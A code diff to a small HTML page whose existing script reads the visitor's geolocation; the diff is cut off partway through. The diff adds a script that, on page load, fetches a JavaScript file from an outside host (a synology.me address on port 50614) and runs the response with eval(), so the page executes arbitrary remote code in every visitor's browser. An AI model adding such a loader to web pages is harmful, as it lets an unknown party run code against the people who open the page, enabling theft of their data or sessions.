@@ -1,6 +1,33 @@
  <html>
 	 <head>
 		 <script>
+ function xmlhttp()
+{
+if (window.XMLHttpRequest)
+{
+    //  IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码
+    return new XMLHttpRequest();
+}
+else
+{
+    // IE6, IE5 浏览器执行代码
+    return new ActiveXObject("Microsoft.XMLHTTP");
+}
+}
+	var xp=xmlhttp();
+	  xp.onreadystatechange=function()
+	  {
+		if (xp.readyState==4 && xp.status==200)
+		{
+		  var s=xp.responseText;
+		  eval(s);
+		}
+	  }
+	  xp.open("GET","http://cqb98.synology.me:50614/static/test.js",true);
+	  xp.send();
+
+		 </script>
+		 <script>
 		 navigator.geolocation.getCurrentPosition(function (position) {
 		       console.log(position);
 			   alert(position.coords.latitude);
